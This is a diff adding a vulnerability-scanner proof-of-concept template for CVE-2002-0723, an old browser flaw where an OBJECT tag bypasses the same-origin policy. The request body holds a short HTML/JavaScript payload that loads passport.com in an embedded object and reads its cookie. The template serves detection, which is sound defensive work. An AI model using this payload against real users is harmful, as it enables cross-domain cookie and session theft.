@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "通过 OBJECT 标签绕过同源策略，跨域读取目标页面 Cookie 和 DOM 信息"
+id = "POC-AVE-2002-0397"
+name = "CVE-2002-0723 PoC"
+severity = "high"
+tags = ["ave-2002-0397"]
+vuln_id = [
+    "CVE-2002-0723",
+    "AVE-2002-0397",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<object id="data" data="empty.html" type="text/html"></object>
+<script>
+var ref=document.getElementById("data").object;
+ref.location.href = "http://www.passport.com";
+setTimeout("alert(ref.cookie)",5000);
+</script>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["object"]
